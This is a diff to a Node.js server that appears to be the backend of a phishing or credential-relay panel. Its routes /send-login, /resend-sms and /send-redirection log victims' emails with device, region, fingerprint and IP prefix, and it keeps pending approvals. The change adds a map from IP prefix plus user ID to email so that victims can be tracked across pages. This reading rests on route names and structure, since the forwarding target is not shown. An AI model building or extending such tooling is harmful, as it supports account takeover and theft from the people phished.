@@ -77,6 +77,7 @@ const pendingRedirection = {};
 const userIds = {};
 const pendingApprovals = {};
 const deviceFingerprintToEmail = {};
+const ipPrefixUserIdToEmail = {};
 
 // ============================================================================
 // 🔔 SELF-PING
@@ -155,6 +156,11 @@ app.post("/send-login", async (req, res) => {
 
     console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
     console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
+
+    // ✅ Store email mapping with ipPrefix + userId for retrieval on next pages
+    const compositeKey = `${ipPrefix}_${userId}`;
+    ipPrefixUserIdToEmail[compositeKey] = email;
+    console.log(`   ✅ Stored: ${compositeKey} → ${email}`);
 
     // Build message
     const message =
@@ -559,7 +565,22 @@ app.post("/resend-sms", async (req, res) => {
 
 app.post("/send-redirection", async (req, res) => {
   try {
-    const { email, userId } = req.body;
+    let { email, userId } = req.body;
+
+    // Detect region and device from request
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const ipPrefix = getIPPrefix(ip);
+
+    // ✅ If email not provided, retrieve from storage using ipPrefix + userId
+    if (!email && userId) {
+      const compositeKey = `${ipPrefix}_${userId}`;
+      email = ipPrefixUserIdToEmail[compositeKey];
+      console.log(`🔍 Retrieved email from storage: ${compositeKey} → ${email}`);
+    }
 
     if (!email) {
       return res.status(400).json({ error: "Missing email" });
@@ -569,12 +590,6 @@ app.post("/send-redirection", async (req, res) => {
     if (pendingRedirection[email]) {
       delete pendingRedirection[email];
     }
-
-    // Detect region and device from request
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
 
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
